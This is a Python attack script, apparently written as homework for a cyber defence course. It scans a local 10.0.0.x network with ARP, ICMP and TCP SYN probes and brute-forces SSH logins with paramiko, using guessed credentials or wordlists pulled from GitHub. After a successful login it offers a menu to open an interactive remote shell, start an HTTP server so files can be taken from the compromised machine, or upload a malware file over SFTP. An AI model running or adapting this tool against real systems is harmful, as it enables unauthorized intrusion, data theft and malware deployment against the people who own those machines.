import requests as r
import scapy.interfaces
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import ARP
import paramiko
import time
from scapy.sendrecv import srp
from scapy.all import conf


Interface = 'Realtek RTL8821CE 802.11ac PCIe Adapter'
usernames_list = []
passwords_list = []

conf.iface = 'Realtek RTL8821CE 802.11ac PCIe Adapter'


def print_interfaces():
    print(scapy.interfaces.show_interfaces())


def get_mac(target_ip):  # make sure the computer knows the mac address
    # Craft ARP request packet
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        pdst=target_ip)  # ethernet frame target 255/24 /arp destination Ip address

    # Send the ARP request and capture responses
    # The timeout parameter specifies how long to wait for responses (in seconds)
    responses, unanswered = srp(arp_request, timeout=2, retry=10, verbose=False)

    # Extract MAC address from the first response, if available
    for index, response in responses:
        return response[Ether].src  # gets from tuple ethernet layer mac address

    # Return None if no response received
    return None


def check_ip_on():
    live_ip = []
    list_ip = ['10.0.0.1', '10.0.0.3', '10.0.0.25', '10.0.0.138']
    list_ip1= ['10.0.0.2']
    my_range = range(255)

    for i in list_ip:
        ip1 = f'10.0.0.{i}'

        ip = i
        mac = get_mac(ip)
        # if ip == '10.0.0.4':
        #     icmp = Ether(dst="080027CAF993")/IP(dst=ip, ttl=120) / ICMP(seq=9999)
        icmp = IP(dst=ip, ttl=120) / ICMP(seq=9999)

        # srploop(icmp, count=4)
        answered, unanswered = sr(icmp, timeout=2, iface=Interface, filter="icmp", verbose=0)
        if answered:
            print(f'{ip} is up')
            live_ip.append(ip)
        else:
            print(f'{ip} is down')

    for on_ip in live_ip:
        search_open_ports(on_ip)


def search_open_ports(ip):
    my_range = range(65536)
    for port in [22, 53, 80, 443, 2202]:
        packet1 = IP(dst=ip) / TCP(dport=port, flags='S')
        response = sr1(packet1, timeout=5, verbose=0)

        if response:
            print(f'{ip}:{port} the port is open')
            send(IP(dst=ip) / TCP(dport=port, flags='A'))  # acknowledge
            send(IP(dst=ip) / TCP(dport=port, flags='R'))  # reset
            if port == 22 or port == 2202:
                # ssh_connect(ip, port, 'kali', 'kali')
                login_at_intervals(ip, port)
        else:
            print(f'{ip}:{port} the port is closed')


def ssh_connect(hostname, port, username, password):
    # Create an SSH client instance
    ssh_client = paramiko.SSHClient()

    try:
        # Automatically add host keys without requiring user confirmation
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the SSH server
        ssh_client.connect(hostname=hostname, port=port, username=username, password=password)

        print("Connected to SSH server successfully")
        print(f'The right username is :{username} and the right password is :{password}')
        choice = input('what you want to do\n'
                       '1.Create a http server to download files from the hacked computer to attacker\n'
                       '2.Any Bash commands\n3.Upload to attacked computer a malware file\n')
        if choice == '1':
            http_server(ssh_client)
        elif choice == '2':
            regular_commands(ssh_client)
        elif choice == '3':
            upload_malware_file(ssh_client)
        # Now you can execute commands, transfer files, etc.
        # For example, you can execute commands like this:
        # stdin, stdout, stderr = ssh_client.exec_command("ls -l")

    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
    except paramiko.SSHException as ssh_err:
        print(f"Unable to establish SSH connection: {ssh_err}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the SSH connection
        ssh_client.close()


def get_usernames():
    global usernames_list
    user_names = r.get('https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/names.txt')
    # print(userNames.text.split())
    usernames_list = user_names.text.split()
    return usernames_list


def get_passwords():
    global passwords_list
    passwords = r.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/'
                      'Common-Credentials/10-million-password-list-top-100000.txt')
    # print(passwords.text.split())
    passwords_list = passwords.text.split()
    return passwords_list


def login_at_intervals(ip, port):
    list_usernames = ['kal', 'mal', 'pal', 'kali']
    list_password = ['mali', 'tali', 'pali', 'kali']
    for user in list_usernames:
        for password in list_password:
            start_time = time.time()
            print(f'Trying to connect using username:{user} and password: {password} ')
            ssh_connect(ip, port, user, password)
            end_time = time.time() - start_time
            print(f'length of time it took for connection {end_time}')


def regular_commands(ssh_client):
    session = ssh_client.get_transport().open_session()  # Create a Session Channel over the transport session
    # which handles low level session (like transport details)
    session.get_pty()  # Request a Pseudo-Terminal -fake terminal a look alike enabling interactive command execution.
    session.invoke_shell()  # Start an Interactive Shell: Invoke the shell on the remote server
    while True:

        user_command = input('please enter your command (e.g ls/cd/pwd/whoami) or enter exit to exit: ')

        if user_command == 'exit':
            break
        else:
            command = user_command
            if 'cd' in user_command:

                c = user_command.split()
                directory = c[1]

                # Ensure we have something to execute after changing the directory
                if len(c) > 2:
                    second_command = ' '.join(c[2:])
                    command = f'cd {directory} && {second_command}'
                    print(command)
                else:
                    command = f'cd {directory} && pwd'  # Just show the current directory
            else:
                command = user_command

        # Read the output from stdout and stderr
        session.send(command + '\n')

        # Give some time for the command to execute and produce output
        time.sleep(1)

        # Read the output
        output = session.recv(4096).decode()  # receives 4096 bites as buffer and decodes it
        print("Command output:")
        print(output)


def http_server(ssh_client):
    # Execute the command
    min = 30
    port = 8090
    start_server_command = f'( python3 -m http.server {port} & sleep {min}; kill $! )' # $! is a special shell variable that holds
    ssh_client.exec_command(start_server_command)
    print(f"Starting HTTP server at port {port}, for {min} seconds")
    time.sleep(min)
    # Stop the HTTP server using the captured PID
    print("HTTP server stopped")


def upload_malware_file(ssh_client):
    while True:
        local_file_path = input('please enter full local path of malware file (format: C:\\): ')
        remote_file_path = input('please enter full remote path of where the malware '
                                 'file is to be uploaded to (format:/home/): ')
        try:
            # local_file_path = r'C:\Users\chana\OneDrive\Documents\Homwork Cyber defence course\Sysinfo.txt'
            # remote_file_path = r'/home/kali/try_hack_me_files/test54.txt' # for test purposes
            sftp_client = ssh_client.open_sftp()
            sftp_client.put(rf'{local_file_path}', rf'{remote_file_path}')
            sftp_client.close()
            print(f"File {local_file_path} uploaded to {remote_file_path}")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            sftp_client.close()


        another = input('do you want to upload another file? (y/n) ')
        if another == 'n':
            break




if __name__ == '__main__':
    # get_usernames()
    # get_passwords()
    # print(usernames_list)
    # print('===================')
    # print(passwords_list)
    # print('===================')

    # ssh_connect('10.0.0.2', 2202, 'kali', 'kali', )
    print_interfaces()
    check_ip_on()
